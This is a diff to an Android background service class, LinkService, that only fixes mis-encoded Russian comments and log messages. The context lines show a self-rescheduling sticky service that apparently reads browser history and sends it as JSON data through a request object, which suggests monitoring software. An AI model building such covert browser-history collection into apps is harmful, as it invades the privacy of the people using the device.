@@ -65,7 +65,7 @@ public class LinkService extends Service {
 		}
 
 		Calendar cal = Calendar.getInstance();
-		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// ÷åðåç 1 ìèíóò
+		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// через 1 минут
 
 		PendingIntent servicePendingIntent = PendingIntent.getService(this,
 				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
@@ -86,7 +86,7 @@ public class LinkService extends Service {
 					"isDoWork return " + Boolean.toString(isWork));
 		}
 
-		linkTask(); // ïðîñîìîòð èñòîðèè áðàóçåðà
+		linkTask(); // просомотр истории браузера
 
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
@@ -181,7 +181,7 @@ public class LinkService extends Service {
 						jsonObject.put("data", data);
 						sendJSONStr = jsonObject.toString();
 					} catch (JSONException e) {
-						Logging.doLog(LOG_TAG, "json ñëîìàëñÿ", "json ñëîìàëñÿ");
+						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 					}
 
 					DataRequest dr = new DataRequest(context);
